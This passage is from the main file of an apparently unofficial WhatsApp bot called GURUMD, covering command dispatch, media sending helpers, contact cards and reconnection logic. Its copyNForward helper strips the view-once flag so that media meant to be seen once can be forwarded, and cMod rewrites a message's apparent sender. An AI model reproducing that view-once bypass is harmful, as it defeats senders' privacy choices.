                                await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
                            } else if (mek.q && command.on === "text") {
                                await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
                            } else if (
                                (command.on === "image" || command.on === "photo") &&
                                mek.type === "imageMessage"
                            ) {
                                await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
                            } else if (
                                command.on === "sticker" &&
                                mek.type === "stickerMessage"
                            ) {
                                await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
                            }
                        } catch (error) {
                            console.log(gurumdStyle('Event handler error:', 'error'), error.message);
                        }
                    });
                }
            });

            //===================================================   
            conn.decodeJid = jid => {
                if (!jid) return jid;
                if (/:\d+@/gi.test(jid)) {
                    let decode = jidDecode(jid) || {};
                    return (
                        (decode.user &&
                            decode.server &&
                            decode.user + '@' + decode.server) ||
                        jid
                    );
                } else return jid;
            };

            //===================================================
            conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
                let vtype;
                if (options.readViewOnce) {
                    message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message 
                        ? message.message.ephemeralMessage.message 
                        : (message.message || undefined);
                    vtype = Object.keys(message.message.viewOnceMessage.message)[0];
                    delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
                    delete message.message.viewOnceMessage.message[vtype].viewOnce;
                    message.message = {
                        ...message.message.viewOnceMessage.message
                    };
                }

                let mtype = Object.keys(message.message)[0];
                let content = await generateForwardMessageContent(message, forceForward);
                let ctype = Object.keys(content)[0];
                let context = {};
                if (mtype != "conversation") context = message.message[mtype].contextInfo;
                content[ctype].contextInfo = {
                    ...context,
                    ...content[ctype].contextInfo
                };
                const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                    ...content[ctype],
                    ...options,
                    ...(options.contextInfo ? {
                        contextInfo: {
                            ...content[ctype].contextInfo,
                            ...options.contextInfo
                        }
                    } : {})
                } : {});
                await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
                return waMessage;
            };

            //=================================================
            conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
                let quoted = message.msg ? message.msg : message;
                let mime = (message.msg || message).mimetype || '';
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
                const stream = await downloadContentFromMessage(quoted, messageType);
                let buffer = Buffer.from([]);
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }
                let type = await FileType.fromBuffer(buffer);
                let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
                await fs.writeFileSync(trueFileName, buffer);
                return trueFileName;
            };

            //=================================================
            conn.downloadMediaMessage = async(message) => {
                let mime = (message.msg || message).mimetype || '';
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
                const stream = await downloadContentFromMessage(message, messageType);
                let buffer = Buffer.from([]);
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }
                return buffer;
            };

            //================================================
            conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                let mime = '';
                try {
                    let res = await axios.head(url);
                    mime = res.headers['content-type'];
                } catch (error) {
                    mime = 'application/octet-stream';
                }
                
                let finalCaption = caption;
                if (config.ENABLE_TAGGING) {
                    const tagText = config.BOT_TAG_TEXT || 'ᴳᵁᴿᵁᴹᴰ • ᴾᴼᵂᴱᴿᴱᴰ ᴮᵞ GURU TECH';
                    finalCaption = config.TAG_POSITION === 'start' 
                        ? `${tagText}\n\n${caption}`
                        : `${caption}\n\n${tagText}`;
                } else {
                    finalCaption = `ᴳᵁᴿᵁᴹᴰ\n\n${caption}`;
                }
                
                if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: finalCaption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
                }
                
                if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: finalCaption, ...options }, { quoted: quoted, ...options });
                }
                
                if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: finalCaption, ...options }, { quoted: quoted, ...options });
                }
                
                if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: finalCaption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
                }
                
                if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: finalCaption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
                }
                
                // Default to document
                return conn.sendMessage(jid, { document: await getBuffer(url), caption: finalCaption, ...options }, { quoted: quoted, ...options });
            };

            //==========================================================
            conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
                let mtype = Object.keys(copy.message)[0];
                let isEphemeral = mtype === 'ephemeralMessage';
                if (isEphemeral) {
                    mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
                }
                let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
                let content = msg[mtype];
                if (typeof content === 'string') msg[mtype] = text || content;
                else if (content.caption) content.caption = text || content.caption;
                else if (content.text) content.text = text || content.text;
                if (typeof content !== 'string') msg[mtype] = {
                    ...content,
                    ...options
                };
                if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
                else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
                if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
                else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
                copy.key.remoteJid = jid;
                copy.key.fromMe = sender === conn.user.id;

                return proto.WebMessageInfo.fromObject(copy);
            };

            //=====================================================
            conn.getFile = async(PATH, save) => {
                let res;
                let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
                let type = await FileType.fromBuffer(data) || {
                    mime: 'application/octet-stream',
                    ext: '.bin'
                };
                let filename = path.join(__dirname, new Date * 1 + '.' + type.ext);
                if (data && save) fs.promises.writeFile(filename, data);
                return {
                    res,
                    filename,
                    size: await getSizeMedia(data),
                    ...type,
                    data
                };
            };

            //=====================================================
            conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
                let types = await conn.getFile(PATH, true);
                let { filename, size, ext, mime, data } = types;
                let type = '',
                    mimetype = mime,
                    pathFile = filename;
                if (options.asDocument) type = 'document';
                if (options.asSticker || /webp/.test(mime)) {
                    let { writeExif } = require('./exif.js');
                    let media = { mimetype: mime, data };
                    pathFile = await writeExif(media, { packname: config.STICKER_NAME, author: config.STICKER_NAME, categories: options.categories ? options.categories : [] });
                    await fs.promises.unlink(filename);
                    type = 'sticker';
                    mimetype = 'image/webp';
                } else if (/image/.test(mime)) type = 'image';
                else if (/video/.test(mime)) type = 'video';
                else if (/audio/.test(mime)) type = 'audio';
                else type = 'document';
                
                // Add Gurumd branding to caption if present
                let finalOptions = { ...options };
                if (finalOptions.caption) {
                    finalOptions.caption = `ᴳᵁᴿᵁᴹᴰ\n\n${finalOptions.caption}`;
                }
                
                await conn.sendMessage(jid, {
                    [type]: { url: pathFile },
                    mimetype,
                    fileName,
                    ...finalOptions
                }, { quoted, ...options });
                return fs.promises.unlink(pathFile);
            };

            //=====================================================
            conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
                let types = await conn.getFile(path, true);
                let { mime, ext, res, data, filename } = types;
                if (res && res.status !== 200 || data.length <= 65536) {
                    try { 
                        throw { json: JSON.parse(data.toString()) }; 
                    } catch (e) { 
                        if (e.json) throw e.json; 
                    }
                }
                let type = '',
                    mimetype = mime,
                    pathFile = filename;
                if (options.asDocument) type = 'document';
                if (options.asSticker || /webp/.test(mime)) {
                    let { writeExif } = require('./exif');
                    let media = { mimetype: mime, data };
                    pathFile = await writeExif(media, { packname: config.STICKER_NAME, author: config.STICKER_NAME, categories: options.categories ? options.categories : [] });
                    await fs.promises.unlink(filename);
                    type = 'sticker';
                    mimetype = 'image/webp';
                } else if (/image/.test(mime)) type = 'image';
                else if (/video/.test(mime)) type = 'video';
                else if (/audio/.test(mime)) type = 'audio';
                else type = 'document';
                
                // Add Gurumd branding to caption
                const finalCaption = `ᴳᵁᴿᵁᴹᴰ\n\n${caption}`;
                
                await conn.sendMessage(jid, {
                    [type]: { url: pathFile },
                    caption: finalCaption,
                    mimetype,
                    fileName,
                    ...options
                }, { quoted, ...options });
                return fs.promises.unlink(pathFile);
            };

            //=====================================================
            conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
                let buffer;
                if (options && (options.packname || options.author)) {
                    let { writeExifVid } = require('./exif');
                    buffer = await writeExifVid(buff, options);
                } else {
                    let { videoToWebp } = require('./lib/converter');
                    buffer = await videoToWebp(buff);
                }
                await conn.sendMessage(
                    jid,
                    { sticker: { url: buffer }, ...options },
                    options
                );
            };

            //=====================================================
            conn.sendImageAsSticker = async (jid, buff, options = {}) => {
                let buffer;
                if (options && (options.packname || options.author)) {
                    let { writeExifImg } = require('./exif');
                    buffer = await writeExifImg(buff, options);
                } else {
                    let { imageToWebp } = require('./lib/converter');
                    buffer = await imageToWebp(buff);
                }
                await conn.sendMessage(
                    jid,
                    { sticker: { url: buffer }, ...options },
                    options
                );
            };

            //=====================================================
            conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => {
                const finalText = `ᴳᵁᴿᵁᴹᴰ\n\n${text}`;
                return conn.sendMessage(jid, { 
                    text: finalText, 
                    contextInfo: { 
                        mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') 
                    }, 
                    ...options 
                }, { quoted });
            };

            //=====================================================
            conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
                let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
                const finalCaption = `ᴳᵁᴿᵁᴹᴰ\n\n${caption}`;
                return await conn.sendMessage(jid, { image: buffer, caption: finalCaption, ...options }, { quoted });
            };

            //=====================================================
            conn.sendText = (jid, text, quoted = '', options) => {
                const finalText = `ᴳᵁᴿᵁᴹᴰ\n\n${text}`;
                return conn.sendMessage(jid, { text: finalText, ...options }, { quoted });
            };

            //=====================================================
            conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
                const finalText = `ᴳᵁᴿᵁᴹᴰ\n\n${text}`;
                let buttonMessage = {
                    text: finalText,
                    footer,
                    buttons,
                    headerType: 2,
                    ...options
                };
                conn.sendMessage(jid, buttonMessage, { quoted, ...options });
            };

            //=====================================================
            conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
                const finalText = `ᴳᵁᴿᵁᴹᴰ\n\n${text}`;
                let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer });
                var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
                    templateMessage: {
                        hydratedTemplate: {
                            imageMessage: message.imageMessage,
                            "hydratedContentText": finalText,
                            "hydratedFooterText": footer,
                            "hydratedButtons": but
                        }
                    }
                }), options);
                conn.relayMessage(jid, template.message, { messageId: template.key.id });
            };

            //=====================================================
            conn.getName = (jid, withoutContact = false) => {
                let id = conn.decodeJid(jid);
                withoutContact = conn.withoutContact || withoutContact;

                let v;

                if (id.endsWith('@g.us'))
                    return new Promise(async resolve => {
                        v = store.contacts[id] || {};
                        if (!(v.name || v.subject || v.notify))
                            v = await conn.groupMetadata(id).catch(() => ({}));
                        resolve(
                            v.name || v.subject || v.notify ||
                            PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international')
                        );
                    });
                else
                    v = id === '0@s.whatsapp.net'
                        ? { id, name: 'WhatsApp' }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

                return (
                    (withoutContact ? '' : v.name) ||
                    v.subject ||
                    v.verifiedName ||
                    PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
                );
            };

            // Vcard Functionality
            conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
                let list = [];
                for (let i of kon) {
                    list.push({
                        displayName: await conn.getName(i + '@s.whatsapp.net'),
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:ᴳᵁᴿᵁᴹᴰ\nitem1.TEL;waid=${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:gurutech@example.com\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/itsguruu/GURU\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;Nairobi;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                    });
                }
                conn.sendMessage(
                    jid,
                    {
                        contacts: {
                            displayName: `${list.length} Contact`,
                            contacts: list,
                        },
                        ...opts,
                    },
                    { quoted },
                );
            };

            // Status aka brio
            conn.setStatus = status => {
                conn.query({
                    tag: 'iq',
                    attrs: {
                        to: '@s.whatsapp.net',
                        type: 'set',
                        xmlns: 'status',
                    },
                    content: [
                        {
                            tag: 'status',
                            attrs: {},
                            content: Buffer.from(`ᴳᵁᴿᵁᴹᴰ • ${status}`, 'utf-8'),
                        },
                    ],
                });
                return status;
            };
            
            conn.serializeM = mek => sms(conn, mek, store);
            
            return conn;
            
        } catch (error) {
            console.log(gurumdStyle('CONNECTION FAILED:', 'error'), error.message);
            
            const retryDelay = Math.min(5000 * Math.pow(2, retryCount), 60000);
            retryCount = Math.min(retryCount + 1, maxRetries);
            console.log(gurumdStyle(`Retrying in ${retryDelay/1000} seconds... (Attempt ${retryCount}/${maxRetries})`, 'warning'));
            
            setTimeout(attemptConnection, retryDelay);
        }
    }
    
    await attemptConnection();
}

// Periodic connection health check
setInterval(() => {
    const timeSinceLastMessage = Date.now() - connectionHealth.lastMessage;
    
    if (timeSinceLastMessage > 300000) { // 5 minutes
        console.log(gurumdStyle('No messages received for 5+ minutes, connection may be stale', 'warning'));
    }
}, 60000); // Check every minute

app.get("/", (req, res) => {
  res.send("ᴳᵁᴿᵁᴹᴰ IS STARTED ✅");
});

app.listen(port, () => {
  console.log(gurumdStyle('WEB SERVER', 'info'));
  console.log(gurumdStyle('Status: Running', 'success'));
  console.log(gurumdStyle('Port: ' + port, 'info'));
  console.log(gurumdStyle('URL: http://localhost:' + port, 'info'));
});

setTimeout(() => {
  connectToWA();
}, 4000);

// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.log(gurumdStyle('UNCAUGHT EXCEPTION:', 'error'), err.stack || err.message || err);
});

process.on("unhandledRejection", (reason, p) => {
  console.log(gurumdStyle('UNHANDLED PROMISE REJECTION:', 'error'), reason);
});
